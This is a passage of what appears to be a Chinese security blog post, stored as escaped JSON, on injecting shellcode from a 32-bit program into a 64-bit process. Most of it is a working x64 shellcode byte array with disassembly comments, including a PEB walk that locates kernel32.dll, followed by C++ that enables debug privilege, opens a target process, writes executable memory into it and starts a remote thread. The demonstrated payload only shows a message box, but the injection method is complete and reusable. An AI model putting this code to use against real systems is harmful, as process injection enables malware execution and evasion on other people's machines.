04A5 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A6 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A7 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A8 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A9 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AA */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AB */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AC */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AD */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AE */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AF */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04B0 */ \"\\x44\\x89\\x44\\x24\\x18\"                             /* mov [rsp+0x18], r8d                      */\n\t/* 04B5 */ \"\\x48\\x89\\x54\\x24\\x10\"                             /* mov [rsp+0x10], rdx                      */\n\t/* 04BA */ \"\\x48\\x89\\x4c\\x24\\x08\"                             /* mov [rsp+0x8], rcx                       */\n\t/* 04BF */ \"\\x48\\x83\\xec\\x38\"                                 /* sub rsp, 0x38                            */\n\t/* 04C3 */ \"\\x8b\\x44\\x24\\x50\"                                 /* mov eax, [rsp+0x50]                      */\n\t/* 04C7 */ \"\\xff\\xc8\"                                         /* dec eax                                  */\n\t/* 04C9 */ \"\\x89\\x44\\x24\\x50\"                                 /* mov [rsp+0x50], eax                      */\n\t/* 04CD */ \"\\xb8\\x01\\x00\\x00\\x00\"                             /* mov eax, 0x1                             */\n\t/* 04D2 */ \"\\x48\\x6b\\xc0\\x00\"                                 /* imul rax, rax, 0x0                       */\n\t/* 04D6 */ \"\\x48\\x8b\\x4c\\x24\\x40\"                             /* mov rcx, [rsp+0x40]                      */\n\t/* 04DB */ \"\\x0f\\xb6\\x04\\x01\"                                 /* movzx eax, byte [rcx+rax]                */\n\t/* 04DF */ \"\\x88\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], al                       */\n\t/* 04E3 */ \"\\x48\\x8b\\x44\\x24\\x40\"                             /* mov rax, [rsp+0x40]                      */\n\t/* 04E8 */ \"\\x48\\x83\\xc0\\x02\"                                 /* add rax, 0x2                             */\n\t/* 04EC */ \"\\x48\\x89\\x44\\x24\\x40\"                             /* mov [rsp+0x40], rax                      */\n\t/* 04F1 */ \"\\xb8\\x01\\x00\\x00\\x00\"                             /* mov eax, 0x1                             */\n\t/* 04F6 */ \"\\x48\\x6b\\xc0\\x00\"                                 /* imul rax, rax, 0x0                       */\n\t/* 04FA */ \"\\x48\\x8b\\x4c\\x24\\x48\"                             /* mov rcx, [rsp+0x48]                      */\n\t/* 04FF */ \"\\x0f\\xb6\\x04\\x01\"                                 /* movzx eax, byte [rcx+rax]                */\n\t/* 0503 */ \"\\x88\\x44\\x24\\x21\"                                 /* mov [rsp+0x21], al                       */\n\t/* 0507 */ \"\\x48\\x8b\\x44\\x24\\x48\"                             /* mov rax, [rsp+0x48]                      */\n\t/* 050C */ \"\\x48\\x83\\xc0\\x02\"                                 /* add rax, 0x2                             */\n\t/* 0510 */ \"\\x48\\x89\\x44\\x24\\x48\"                             /* mov [rsp+0x48], rax                      */\n\t/* 0515 */ \"\\x0f\\xb6\\x4c\\x24\\x20\"                             /* movzx ecx, byte [rsp+0x20]               */\n\t/* 051A */ \"\\xe8\\x31\\xfe\\xff\\xff\"                             /* call 0x350                               */\n\t/* 051F */ \"\\x0f\\xbe\\xc0\"                                     /* movsx eax, al                            */\n\t/* 0522 */ \"\\x89\\x44\\x24\\x28\"                                 /* mov [rsp+0x28], eax                      */\n\t/* 0526 */ \"\\x0f\\xb6\\x4c\\x24\\x21\"                             /* movzx ecx, byte [rsp+0x21]               */\n\t/* 052B */ \"\\xe8\\x20\\xfe\\xff\\xff\"                             /* call 0x350                               */\n\t/* 0530 */ \"\\x0f\\xbe\\xc0\"                                     /* movsx eax, al                            */\n\t/* 0533 */ \"\\x8b\\x4c\\x24\\x28\"                                 /* mov ecx, [rsp+0x28]                      */\n\t/* 0537 */ \"\\x2b\\xc8\"                                         /* sub ecx, eax                             */\n\t/* 0539 */ \"\\x8b\\xc1\"                                         /* mov eax, ecx                             */\n\t/* 053B */ \"\\x89\\x44\\x24\\x24\"                                 /* mov [rsp+0x24], eax                      */\n\t/* 053F */ \"\\x83\\x7c\\x24\\x24\\x00\"                             /* cmp dword [rsp+0x24], 0x0                */\n\t/* 0544 */ \"\\x75\\x1d\"                                         /* jnz 0x563                                */\n\t/* 0546 */ \"\\x0f\\xbe\\x44\\x24\\x20\"                             /* movsx eax, byte [rsp+0x20]               */\n\t/* 054B */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 054D */ \"\\x74\\x14\"                                         /* jz 0x563                                 */\n\t/* 054F */ \"\\x0f\\xbe\\x44\\x24\\x21\"                             /* movsx eax, byte [rsp+0x21]               */\n\t/* 0554 */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0556 */ \"\\x74\\x0b\"                                         /* jz 0x563                                 */\n\t/* 0558 */ \"\\x83\\x7c\\x24\\x50\\x00\"                             /* cmp dword [rsp+0x50], 0x0                */\n\t/* 055D */ \"\\x0f\\x87\\x60\\xff\\xff\\xff\"                         /* ja 0x4c3                                 */\n\t/* 0563 */ \"\\x8b\\x44\\x24\\x24\"                                 /* mov eax, [rsp+0x24]                      */\n\t/* 0567 */ \"\\x48\\x83\\xc4\\x38\"                                 /* add rsp, 0x38                            */\n\t/* 056B */ \"\\xc3\"                                             /* ret                                      */\n\t/* 056C */ \"\\xcc\"                                             /* int3                                     */\n\t/* 056D */ \"\\xcc\"                                             /* int3                                     */\n\t/* 056E */ \"\\xcc\"                                             /* int3                                     */\n\t/* 056F */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0570 */ \"\\x44\\x89\\x44\\x24\\x18\"                             /* mov [rsp+0x18], r8d                      */\n\t/* 0575 */ \"\\x48\\x89\\x54\\x24\\x10\"                             /* mov [rsp+0x10], rdx                      */\n\t/* 057A */ \"\\x48\\x89\\x4c\\x24\\x08\"                             /* mov [rsp+0x8], rcx                       */\n\t/* 057F */ \"\\x48\\x83\\xec\\x28\"                                 /* sub rsp, 0x28                            */\n\t/* 0583 */ \"\\x48\\x8b\\x44\\x24\\x38\"                             /* mov rax, [rsp+0x38]                      */\n\t/* 0588 */ \"\\x48\\x89\\x44\\x24\\x10\"                             /* mov [rsp+0x10], rax                      */\n\t/* 058D */ \"\\x48\\x8b\\x44\\x24\\x30\"                             /* mov rax, [rsp+0x30]                      */\n\t/* 0592 */ \"\\x48\\x89\\x44\\x24\\x08\"                             /* mov [rsp+0x8], rax                       */\n\t/* 0597 */ \"\\x8b\\x44\\x24\\x40\"                                 /* mov eax, [rsp+0x40]                      */\n\t/* 059B */ \"\\x89\\x04\\x24\"                                     /* mov [rsp], eax                           */\n\t/* 059E */ \"\\x8b\\x44\\x24\\x40\"                                 /* mov eax, [rsp+0x40]                      */\n\t/* 05A2 */ \"\\xff\\xc8\"                                         /* dec eax                                  */\n\t/* 05A4 */ \"\\x89\\x44\\x24\\x40\"                                 /* mov [rsp+0x40], eax                      */\n\t/* 05A8 */ \"\\x83\\x3c\\x24\\x00\"                                 /* cmp dword [rsp], 0x0                     */\n\t/* 05AC */ \"\\x74\\x2b\"                                         /* jz 0x5d9                                 */\n\t/* 05AE */ \"\\x48\\x8b\\x44\\x24\\x08\"                             /* mov rax, [rsp+0x8]                       */\n\t/* 05B3 */ \"\\x48\\x8b\\x4c\\x24\\x10\"                             /* mov rcx, [rsp+0x10]                      */\n\t/* 05B8 */ \"\\x0f\\xb6\\x09\"                                     /* movzx ecx, byte [rcx]                    */\n\t/* 05BB */ \"\\x88\\x08\"                                         /* mov [rax], cl                            */\n\t/* 05BD */ \"\\x48\\x8b\\x44\\x24\\x08\"                             /* mov rax, [rsp+0x8]                       */\n\t/* 05C2 */ \"\\x48\\xff\\xc0\"                                     /* inc rax                                  */\n\t/* 05C5 */ \"\\x48\\x89\\x44\\x24\\x08\"                             /* mov [rsp+0x8], rax                       */\n\t/* 05CA */ \"\\x48\\x8b\\x44\\x24\\x10\"                             /* mov rax, [rsp+0x10]                      */\n\t/* 05CF */ \"\\x48\\xff\\xc0\"                                     /* inc rax                                  */\n\t/* 05D2 */ \"\\x48\\x89\\x44\\x24\\x10\"                             /* mov [rsp+0x10], rax                      */\n\t/* 05D7 */ \"\\xeb\\xbe\"                                         /* jmp 0x597                                */\n\t/* 05D9 */ \"\\x48\\x8b\\x44\\x24\\x30\"                             /* mov rax, [rsp+0x30]                      */\n\t/* 05DE */ \"\\x48\\x83\\xc4\\x28\"                                 /* add rsp, 0x28                            */\n\t/* 05E2 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 05E3 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E4 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E5 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E6 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E7 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E8 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E9 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05EA */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05EB */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05EC */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05ED */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05EE */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05EF */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05F0 */ \"\\x48\\x89\\x4c\\x24\\x08\"                             /* mov [rsp+0x8], rcx                       */\n\t/* 05F5 */ \"\\x48\\x83\\xec\\x18\"                                 /* sub rsp, 0x18                            */\n\t/* 05F9 */ \"\\xc7\\x04\\x24\\x00\\x00\\x00\\x00\"                     /* mov dword [rsp], 0x0                     */\n\t/* 0600 */ \"\\x48\\x8b\\x44\\x24\\x20\"                             /* mov rax, [rsp+0x20]                      */\n\t/* 0605 */ \"\\x48\\x89\\x44\\x24\\x08\"                             /* mov [rsp+0x8], rax                       */\n\t/* 060A */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 060D */ \"\\xc1\\xe0\\x07\"                                     /* shl eax, 0x7                             */\n\t/* 0610 */ \"\\x8b\\x0c\\x24\"                                     /* mov ecx, [rsp]                           */\n\t/* 0613 */ \"\\xc1\\xe9\\x19\"                                     /* shr ecx, 0x19                            */\n\t/* 0616 */ \"\\x03\\xc1\"                                         /* add eax, ecx                             */\n\t/* 0618 */ \"\\x48\\x8b\\x4c\\x24\\x08\"                             /* mov rcx, [rsp+0x8]                       */\n\t/* 061D */ \"\\x0f\\xb6\\x09\"                                     /* movzx ecx, byte [rcx]                    */\n\t/* 0620 */ \"\\x03\\xc1\"                                         /* add eax, ecx                             */\n\t/* 0622 */ \"\\x89\\x04\\x24\"                                     /* mov [rsp], eax                           */\n\t/* 0625 */ \"\\x48\\x8b\\x44\\x24\\x08\"                             /* mov rax, [rsp+0x8]                       */\n\t/* 062A */ \"\\x0f\\xb6\\x00\"                                     /* movzx eax, byte [rax]                    */\n\t/* 062D */ \"\\x89\\x44\\x24\\x04\"                                 /* mov [rsp+0x4], eax                       */\n\t/* 0631 */ \"\\x48\\x8b\\x44\\x24\\x08\"                             /* mov rax, [rsp+0x8]                       */\n\t/* 0636 */ \"\\x48\\xff\\xc0\"                                     /* inc rax                                  */\n\t/* 0639 */ \"\\x48\\x89\\x44\\x24\\x08\"                             /* mov [rsp+0x8], rax                       */\n\t/* 063E */ \"\\x83\\x7c\\x24\\x04\\x00\"                             /* cmp dword [rsp+0x4], 0x0                 */\n\t/* 0643 */ \"\\x75\\xc5\"                                         /* jnz 0x60a                                */\n\t/* 0645 */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 0648 */ \"\\x48\\x83\\xc4\\x18\"                                 /* add rsp, 0x18                            */\n\t/* 064C */ \"\\xc3\"                                             /* ret                                      */\n\t/* 064D */ \"\\xcc\"                                             /* int3                                     */\n\t/* 064E */ \"\\xcc\"                                             /* int3                                     */\n\t/* 064F */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0650 */ \"\\x48\\x81\\xec\\x88\\x02\\x00\\x00\"                     /* sub rsp, 0x288                           */\n\t/* 0657 */ \"\\x48\\xc7\\x44\\x24\\x60\\xff\\xff\\xff\\xff\"             /* mov qword [rsp+0x60], 0xffffffffffffffff */\n\t/* 0660 */ \"\\x65\\x48\\x8b\\x04\\x25\\x60\\x00\\x00\\x00\"             /* mov rax, [gs:0x60]                       */\n\t/* 0669 */ \"\\x48\\x89\\x44\\x24\\x68\"                             /* mov [rsp+0x68], rax                      */\n\t/* 066E */ \"\\x48\\x8b\\x44\\x24\\x68\"                             /* mov rax, [rsp+0x68]                      */\n\t/* 0673 */ \"\\x48\\x8b\\x40\\x18\"                                 /* mov rax, [rax+0x18]                      */\n\t/* 0677 */ \"\\x48\\x83\\xc0\\x20\"                                 /* add rax, 0x20                            */\n\t/* 067B */ \"\\x48\\x89\\x44\\x24\\x58\"                             /* mov [rsp+0x58], rax                      */\n\t/* 0680 */ \"\\x48\\x8b\\x44\\x24\\x58\"                             /* mov rax, [rsp+0x58]                      */\n\t/* 0685 */ \"\\x48\\x8b\\x00\"                                     /* mov rax, [rax]                           */\n\t/* 0688 */ \"\\x48\\x89\\x44\\x24\\x30\"                             /* mov [rsp+0x30], rax                      */\n\t/* 068D */ \"\\xb8\\x6b\\x00\\x00\\x00\"                             /* mov eax, 0x6b                            */\n\t/* 0692 */ \"\\x66\\x89\\x44\\x24\\x38\"                             /* mov [rsp+0x38], ax                       */\n\t/* 0697 */ \"\\xb8\\x65\\x00\\x00\\x00\"                             /* mov eax, 0x65                            */\n\t/* 069C */ \"\\x66\\x89\\x44\\x24\\x3a\"                             /* mov [rsp+0x3a], ax                       */\n\t/* 06A1 */ \"\\xb8\\x72\\x00\\x00\\x00\"                             /* mov eax, 0x72                            */\n\t/* 06A6 */ \"\\x66\\x89\\x44\\x24\\x3c\"                             /* mov [rsp+0x3c], ax                       */\n\t/* 06AB */ \"\\xb8\\x6e\\x00\\x00\\x00\"                             /* mov eax, 0x6e                            */\n\t/* 06B0 */ \"\\x66\\x89\\x44\\x24\\x3e\"                             /* mov [rsp+0x3e], ax                       */\n\t/* 06B5 */ \"\\xb8\\x65\\x00\\x00\\x00\"                             /* mov eax, 0x65                            */\n\t/* 06BA */ \"\\x66\\x89\\x44\\x24\\x40\"                             /* mov [rsp+0x40], ax                       */\n\t/* 06BF */ \"\\xb8\\x6c\\x00\\x00\\x00\"                             /* mov eax, 0x6c                            */\n\t/* 06C4 */ \"\\x66\\x89\\x44\\x24\\x42\"                             /* mov [rsp+0x42], ax                       */\n\t/* 06C9 */ \"\\xb8\\x33\\x00\\x00\\x00\"                             /* mov eax, 0x33                            */\n\t/* 06CE */ \"\\x66\\x89\\x44\\x24\\x44\"                             /* mov [rsp+0x44], ax                       */\n\t/* 06D3 */ \"\\xb8\\x32\\x00\\x00\\x00\"                             /* mov eax, 0x32                            */\n\t/* 06D8 */ \"\\x66\\x89\\x44\\x24\\x46\"                             /* mov [rsp+0x46], ax                       */\n\t/* 06DD */ \"\\xb8\\x2e\\x00\\x00\\x00\"                             /* mov eax, 0x2e                            */\n\t/* 06E2 */ \"\\x66\\x89\\x44\\x24\\x48\"                             /* mov [rsp+0x48], ax                       */\n\t/* 06E7 */ \"\\xb8\\x64\\x00\\x00\\x00\"                             /* mov eax, 0x64                            */\n\t/* 06EC */ \"\\x66\\x89\\x44\\x24\\x4a\"                             /* mov [rsp+0x4a], ax                       */\n\t/* 06F1 */ \"\\xb8\\x6c\\x00\\x00\\x00\"                             /* mov eax, 0x6c                            */\n\t/* 06F6 */ \"\\x66\\x89\\x44\\x24\\x4c\"                             /* mov [rsp+0x4c], ax                       */\n\t/* 06FB */ \"\\xb8\\x6c\\x00\\x00\\x00\"                             /* mov eax, 0x6c                            */\n\t/* 0700 */ \"\\x66\\x89\\x44\\x24\\x4e\"                             /* mov [rsp+0x4e], ax                       */\n\t/* 0705 */ \"\\x33\\xc0\"                                         /* xor eax, eax                             */\n\t/* 0707 */ \"\\x66\\x89\\x44\\x24\\x50\"                             /* mov [rsp+0x50], ax                       */\n\t/* 070C */ \"\\x48\\x8b\\x44\\x24\\x58\"                             /* mov rax, [rsp+0x58]                      */\n\t/* 0711 */ \"\\x48\\x39\\x44\\x24\\x30\"                             /* cmp [rsp+0x30], rax                      */\n\t/* 0716 */ \"\\x0f\\x84\\x8b\\x00\\x00\\x00\"                         /* jz 0x7a7                                 */\n\t/* 071C */ \"\\x48\\x8b\\x44\\x24\\x30\"                             /* mov rax, [rsp+0x30]                      */\n\t/* 0721 */ \"\\x48\\x83\\xe8\\x10\"                                 /* sub rax, 0x10                            */\n\t/* 0725 */ \"\\x48\\x89\\x44\\x24\\x28\"                             /* mov [rsp+0x28], rax                      */\n\t/* 072A */ \"\\x48\\x8b\\x44\\x24\\x28\"                             /* mov rax, [rsp+0x28]                      */\n\t/* 072F */ \"\\x0f\\xb7\\x40\\x48\"                                 /* movzx eax, word [rax+0x48]               */\n\t/* 0733 */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0735 */ \"\\x74\\x5e\"                                         /* jz 0x795                                 */\n\t/* 0737 */ \"\\x48\\x8b\\x44\\x24\\x28\"                             /* mov rax, [rsp+0x28]                      */\n\t/* 073C */ \"\\x0f\\xb7\\x40\\x48\"                                 /* movzx eax, word [rax+0x48]               */\n\t/* 0740 */ \"\\x89\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], eax                      */\n\t/* 0744 */ \"\\x44\\x8b\\x44\\x24\\x20\"                             /* mov r8d, [rsp+0x20]                      */\n\t/* 0749 */ \"\\x48\\x8b\\x44\\x24\\x28\"                             /* mov rax, [rsp+0x28]                      */\n\t/* 074E */ \"\\x48\\x8b\\x50\\x50\"                                 /* mov rdx, [rax+0x50]                      */\n\t/* 0752 */ \"\\x48\\x8d\\x4c\\x24\\x70\"                             /* lea rcx, [rsp+0x70]                      */\n\t/* 0757 */ \"\\xe8\\x14\\xfe\\xff\\xff\"                             /* call 0x570                               */\n\t/* 075C */ \"\\x8b\\x44\\x24\\x20\"                                 /* mov eax, [rsp+0x20]                      */\n\t/* 0760 */ \"\\x33\\xd2\"                                         /* xor edx, edx                             */\n\t/* 0762 */ \"\\xb9\\x02\\x00\\x00\\x00\"                             /* mov ecx, 0x2                             */\n\t/* 0767 */ \"\\x48\\xf7\\xf1\"                                     /* div rcx                                  */\n\t/* 076A */ \"\\x33\\xc9\"                                         /* xor ecx, ecx                             */\n\t/* 076C */ \"\\x66\\x89\\x4c\\x44\\x70\"                             /* mov [rsp+rax*2+0x70], cx                 */\n\t/* 0771 */ \"\\x48\\x8d\\x54\\x24\\x38\"                             /* lea rdx, [rsp+0x38]                      */\n\t/* 0776 */ \"\\x48\\x8d\\x4c\\x24\\x70\"                             /* lea rcx, [rsp+0x70]                      */\n\t/* 077B */ \"\\xe8\\x50\\xfc\\xff\\xff\"                             /* call 0x3d0                               */\n\t/* 0780 */ \"\\x48\\x85\\xc0\"                                     /* test rax, rax                            */\n\t/* 0783 */ \"\\x74\\x10\"                                         /* jz 0x795                                 */\n\t/* 0785 */ \"\\x48\\x8b\\x44\\x24\\x28\"                             /* mov rax, [rsp+0x28]                      */\n\t/* 078A */ \"\\x48\\x8b\\x40\\x30\"                                 /* mov rax, [rax+0x30]                      */\n\t/* 078E */ \"\\x48\\x89\\x44\\x24\\x60\"                             /* mov [rsp+0x60], rax                      */\n\t/* 0793 */ \"\\xeb\\x12\"                                         /* jmp 0x7a7                                */\n\t/* 0795 */ \"\\x48\\x8b\\x44\\x24\\x30\"                             /* mov rax, [rsp+0x30]                      */\n\t/* 079A */ \"\\x48\\x8b\\x00\"                                     /* mov rax, [rax]                           */\n\t/* 079D */ \"\\x48\\x89\\x44\\x24\\x30\"                             /* mov [rsp+0x30], rax                      */\n\t/* 07A2 */ \"\\xe9\\x65\\xff\\xff\\xff\"                             /* jmp 0x70c                                */\n\t/* 07A7 */ \"\\x48\\x8b\\x44\\x24\\x60\"                             /* mov rax, [rsp+0x60]                      */\n\t/* 07AC */ \"\\x48\\x81\\xc4\\x88\\x02\\x00\\x00\"                     /* add rsp, 0x288                           */\n\t/* 07B3 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 07B4 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07B5 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07B6 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07B7 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07B8 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07B9 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BA */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BB */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BC */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BD */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BE */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BF */ \"\\xcc\"                                             /* int3                                     */\n};\ntypedef struct _RemoteParam {\n\tchar szMsg[12];    //MessageBox函数中显示的字符提示  \n\tDWORD dwMessageBox;//MessageBox函数的入口地址  \n} RemoteParam, * PRemoteParam;\ntypedef VOID(*pCreateRemoteThread64) (HANDLE hProcess,\n\tLPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,\n\tLPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,\n\tDWORD dwCreationFlags, LPDWORD lpThreadId, LPHANDLE hThread);\n//定义MessageBox类型的函数指针\ntypedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);\n\nDWORD __stdcall threadProc(LPVOID lParam)\n{\n\tRemoteParam* pRP = (RemoteParam*)lParam;\n\tPFN_MESSAGEBOX pfnMessageBox;\n\tpfnMessageBox = (PFN_MESSAGEBOX)pRP->dwMessageBox;\n\tpfnMessageBox(NULL, pRP->szMsg, pRP->szMsg, 0);\n\treturn 0;\n}\nbool enableDebugPriv()\n{\n\tHANDLE hToken;\n\tLUID sedebugnameValue;\n\tTOKEN_PRIVILEGES tkp;\n\tif (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {\n\t\treturn false;\n\t}\n\tif (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {\n\t\tCloseHandle(hToken);\n\t\treturn false;\n\t}\n\ttkp.PrivilegeCount = 1;\n\ttkp.Privileges[0].Luid = sedebugnameValue;\n\ttkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\tif (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {\n\t\tCloseHandle(hToken);\n\t\treturn false;\n\t}\n\treturn true;\n}\nHANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)\n{\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tPROCESSENTRY32 pe;\n\tpe.dwSize = sizeof(PROCESSENTRY32);\n\tif (!Process32First(hSnapshot, &pe)) {\n\t\tMessageBoxA(NULL,\n\t\t\t\"The frist entry of the process list has not been copyied to the buffer\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\twhile (Process32Next(hSnapshot, &pe)) {\n\t\tif (!lstrcmpW(lpszProcessName, pe.szExeFile)) {\n\t\t\treturn OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);\n\t\t}\n\t}\n\treturn 0;\n}\nLPVOID init_func(char* asmcode, DWORD len)\n{\n\tLPVOID sc = NULL;\n\t// allocate write/executable memory for code\n\tsc = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tif (sc != NULL) {\n\t\t// copy code\n\t\tmemcpy(sc, asmcode, len);\n\t}\n\telse {\n\t\tMessageBoxA(NULL, \"VirtualAlloc()\", \"Notice\", MB_ICONINFORMATION | MB_OK);\n\t}\n\treturn sc;\n}\nint main()\n{\n\tconst DWORD dwThreadSize = 4096;\n\tDWORD dwWriteBytes = 0;\n\tenableDebugPriv();\n\tHANDLE TargetProc = GetProcessHandleByName(L\"CCC.exe\");//进程名称\n\tif (!TargetProc)\n\t{\n\t\tMessageBoxA(NULL,\n\t\t\t\"Open target process failed !\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\n\tBOOL ISWow64 = false;\n\tIsWow64Process(TargetProc, &ISWow64);\n\n\tif (ISWow64)\n\t{\n\t\tcout << \"32Bit Process \" <<endl;\n\t\t//在宿主进程中为线程体开辟一块存储区域  \n\t\t//在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  \n\t\t//其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  \n\t\tvoid* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n\t\t\tdwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\t\tif (!pRemoteThread) {\n\t\t\tMessageBoxA(NULL, \"Alloc memory in target process failed !\",\n\t\t\t\t\"notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\n\t\t//将线程体拷贝到宿主进程中  \n\t\tif (!WriteProcessMemory(TargetProc,\n\t\t\tpRemoteThread, &threadProc, dwThreadSize, 0)) {\n\t\t\tMessageBoxA(NULL, \"Write data to target process failed !\",\n\t\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\tcout << \"pRemoteThread:\" << hex << pRemoteThread << endl;\n\t\tgetchar();\n\t\t//定义线程参数结构体变量  \n\t\tRemoteParam remoteData;\n\t\tZeroMemory(&remoteData, sizeof(RemoteParam));\n\n\t\t//填充结构体变量中的成员  \n\t\tHINSTANCE hUser32 = LoadLibrary(L\"User32.dll\");\n\t\tremoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, \"MessageBoxA\");\n\t\tstrcat_s(remoteData.szMsg, \"Hello＼0\");\n\n\t\t//为线程参数在宿主进程中开辟存储区域  \n\t\tRemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(\n\t\t\tTargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);\n\n\t\tif (!pRemoteParam) {\n\t\t\tMessageBoxA(NULL, \"Alloc memory failed !\",\n\t\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\t//将线程参数拷贝到宿主进程地址空间中  \n\t\tif (!WriteProcessMemory(TargetProc,\n\t\t\tpRemoteParam, &remoteData, sizeof(remoteData), 0)) {\n\t\t\tMessageBoxA(NULL, \"Write data to target process failed !\",\n\t\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\n\t\t//在宿主进程中创建线程  \n\t\tHANDLE hRemoteThread = CreateRemoteThread(\n\t\t\tTargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,\n\t\t\tpRemoteParam, 0, &dwWriteBytes);\n\t\tif (!hRemoteThread) {\n\t\t\tMessageBoxA(NULL, \"Create remote thread failed !\", \"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\tCloseHandle(hRemoteThread);\n\t\tFreeLibrary(hUser32);\n\t\treturn 0;\n\n\t}\n\telse\n\t{\n\n\t\tcout << \"64Bit Process \" << endl;\n\t\tvoid* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n\t\t\tEXECPIC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\t\tif (!pRemoteThread) {\n\t\t\tMessageBoxA(NULL, \"Alloc memory in target process failed !\",\n\t\t\t\t\"notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\tif (!WriteProcessMemory(TargetProc, pRemoteThread, EXECPIC, EXECPIC_SIZE, 0))\n\t\t{\n\t\t\tMessageBoxA(NULL, \"Write data to target process failed !\",\n\t\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\tHANDLE hThread = NULL;\n\t\tpCreateRemoteThread64 CreateRemoteThread64 = (pCreateRemoteThread64)init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE);\n\t\tCreateRemoteThread64(TargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, 0, 0, 0, &hThread);\n\t\tif (!hThread)\n\t\t{\n\t\t\tMessageBoxA(NULL, \"CreateRemoteThread64 target thread failed !\",\n\t\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\tWaitForSingleObject(hThread, INFINITE);\n\t}\n\treturn 0;\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/32位程序对64位进程的远程注入实现.md","raw":"---\ntitle: 32->64注入shellcode\ntags: [安全技术]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/timg.jpg\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/timg.jpg\n---\n\n## 远进程注入\n\n[注入参考——必看](https://www.cnblogs.com/uAreKongqi/p/6012353.html)\n\n### 32位->32位 